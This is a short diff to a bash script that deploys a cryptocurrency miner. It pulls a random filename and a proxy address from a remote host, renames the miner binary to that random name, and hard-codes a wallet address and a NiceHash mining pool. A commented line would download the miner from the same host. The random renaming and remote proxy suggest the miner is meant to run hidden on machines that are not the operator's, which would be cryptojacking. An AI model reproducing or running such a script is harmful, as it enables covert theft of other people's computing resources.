@@ -1,7 +1,7 @@
 #!/bin/bash
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x bubu && mv bubu $ACAK
+chmod +x bubui && mv bubui $ACAK
 WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
 POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti.php))
